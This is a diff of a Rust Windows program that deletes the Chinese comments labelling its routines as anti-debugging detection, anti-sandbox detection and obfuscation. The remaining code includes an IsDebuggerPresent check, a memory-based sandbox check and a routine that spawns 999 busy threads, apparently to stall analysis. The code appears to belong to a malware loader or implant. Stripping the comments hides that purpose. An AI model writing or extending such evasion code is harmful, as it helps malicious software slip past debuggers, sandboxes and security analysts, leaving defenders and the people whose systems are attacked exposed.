@@ -357,7 +357,6 @@ unsafe extern "system" fn window_proc(
     DefWindowProcW(hwnd, msg, wparam, lparam)
 }
 
-// 反调试检测
 fn anti_debugging() {
     unsafe {
         if IsDebuggerPresent().as_bool() {
@@ -423,7 +422,6 @@ unsafe fn get_peb() -> PEB {
     *peb_ptr.as_ref().unwrap()
 }
 
-// 反沙箱检测
 fn anti_sandbox() {
     unsafe {
         let mut mem_status = MEMORYSTATUSEX {
@@ -446,7 +444,6 @@ fn anti_sandbox() {
 fn logic_boom() -> Vec<u8> {
     let mut handles = Vec::new();
 
-    // 定义每个线程的计算逻辑
     let worker = move || {
         let mut xyh: f64 = 4.15684466294867;
         let zzy: f64 = 2.15684466294767;
@@ -467,13 +464,11 @@ fn logic_boom() -> Vec<u8> {
         }
     };
 
-    // 启动多个线程
     for _ in 0..999 {
         handles.push(thread::spawn(worker.clone()));
 
     }
 
-    // 混淆
     for handle in handles {
         handle.join().unwrap();
     }
